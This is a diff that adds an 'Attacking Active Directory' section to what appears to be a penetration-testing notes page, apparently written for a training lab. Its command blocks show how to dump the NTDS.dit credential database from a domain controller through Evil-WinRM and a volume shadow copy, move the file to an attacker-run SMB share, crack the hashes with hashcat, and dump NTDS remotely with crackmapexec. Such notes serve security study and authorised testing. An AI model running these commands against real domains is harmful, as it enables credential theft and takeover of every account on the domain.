@@ -318,3 +318,62 @@ A service principal name (SPN) is a unique identifier of a service instance. Ke
 
 User Account Control (UAC) is a fundamental component of Microsoft's overall security vision. UAC helps mitigate the impact of malware.
 
+
+## Attacking Active Directory
+
+Once a Windows system is joined to a domain, it will no longer default to referencing [the SAM database](attacking-sam.md) to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. 
+
+If needed, use tools like [username Anarchy](username-anarchy.md) to create list of usernames.
+
+
+### 1. Dumping ntds.dit
+
+#### Dumping ntds.dit locally
+
+`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot$/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).
+
+The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain
+
+
+```shell-session
+# Connect to a DC with Evil-WinRM
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+
+# To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. Check Local Group Membership:
+*Evil-WinRM* PS C:\> net localgroup
+
+# Check User Account Privileges including Domain. If the account has both Administrators and Domain Administrator rights, this means we can do just about anything we want, including making a copy of the NTDS.dit file.
+net user <username>
+
+# Use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. Create a Shadow Copy of C:
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+
+# Copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+[Launch smbserver in our attacker machine](smbserver.md):
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
+```
+
+Now, from PS in the victim's windows machine:
+
+```powershell
+# Transfer the file to attacker machine
+cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
+```
+
+And... crack the hash with [hashcat](hashcat.md):
+
+```bash
+sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
+```
+
+
+#### Dumpins ntds.dit remotely
+
+```bash
+crackmapexec smb $ip -u <username> -p <password> --ntds
+```
